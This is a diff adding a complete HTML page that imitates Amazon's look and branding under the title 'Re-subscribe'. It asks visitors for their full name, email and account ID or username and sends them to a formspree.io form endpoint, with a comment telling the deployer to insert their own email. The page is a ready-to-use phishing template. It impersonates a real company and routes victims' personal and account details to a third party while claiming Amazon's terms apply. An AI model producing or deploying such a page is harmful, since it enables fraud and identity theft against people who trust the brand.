@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Amazon | Re-subscribe</title>
+    <style>
+        body { margin: 0; font-family: 'Arial', sans-serif; background-color: #eaeded; color: #0f1111; }
+        
+        /* Navigation Bar */
+        header { background-color: #131921; padding: 10px 20px; display: flex; align-items: center; color: white; }
+        .logo { font-size: 24px; font-weight: bold; color: #ff9900; margin-right: 20px; }
+        .search-bar { flex-grow: 1; display: flex; height: 40px; }
+        .search-bar input { flex-grow: 1; border: none; border-radius: 4px 0 0 4px; padding: 0 10px; }
+        .search-bar button { background-color: #febd69; border: none; width: 45px; border-radius: 0 4px 4px 0; cursor: pointer; }
+
+        /* Main Layout */
+        .container { max-width: 1200px; margin: 20px auto; padding: 0 20px; display: flex; justify-content: center; }
+
+        /* Order Card */
+        .order-card { background: white; padding: 25px; width: 100%; max-width: 450px; border: 1px solid #ddd; border-radius: 8px; }
+        h1 { font-size: 28px; font-weight: 400; margin-bottom: 20px; }
+        
+        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 5px; margin-top: 15px; }
+        input, select { width: 100%; padding: 8px; border: 1px solid #a6a6a6; border-radius: 3px; box-sizing: border-box; }
+        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,0.5); outline: none; }
+
+        /* Amazon-style Yellow Button */
+        .btn-amazon { 
+            background: linear-gradient(to bottom, #f7dfa5, #f0c14b);
+            border: 1px solid #a88734;
+            border-radius: 3px;
+            color: #111;
+            cursor: pointer;
+            display: inline-block;
+            font-size: 13px;
+            height: 31px;
+            margin-top: 20px;
+            width: 100%;
+            box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset;
+        }
+        .btn-amazon:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); border-color: #9c7e31; }
+
+        .disclaimer { font-size: 12px; color: #565959; margin-top: 15px; line-height: 1.5; }
+        .disclaimer a { color: #0066c0; text-decoration: none; }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">amazon</div>
+    <div class="search-bar">
+        <input type="text" placeholder="Search for your subscription">
+        <button>🔍</button>
+    </div>
+</header>
+
+<div class="container">
+    <div class="order-card">
+        <h1>Re-subscribe</h1>
+        
+        <!-- Replace your email below -->
+        <form action="https://formspree.io/f/your@email.com" method="POST">
+            <label for="name">Full Name</label>
+            <input type="text" id="name" name="name" required>
+
+            <label for="email">Email</label>
+            <input type="email" id="email" name="_replyto" required>
+
+            <label for="user_id">Account ID / Username</label>
+            <input type="text" id="user_id" name="user_id" placeholder="e.g. TitanPlayer23" required>
+
+            <label for="plan">Choose your plan</label>
+            <select name="plan" id="plan">
+                <option value="monthly">Monthly Subscription - $9.99</option>
+                <option value="yearly">Yearly Savings - $89.00</option>
+            </select>
+
+            <button type="submit" class="btn-amazon">Continue</button>
+        </form>
+
+        <p class="disclaimer">
+            By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
+        </p>
+    </div>
+</div>
+
+</body>
+</html>
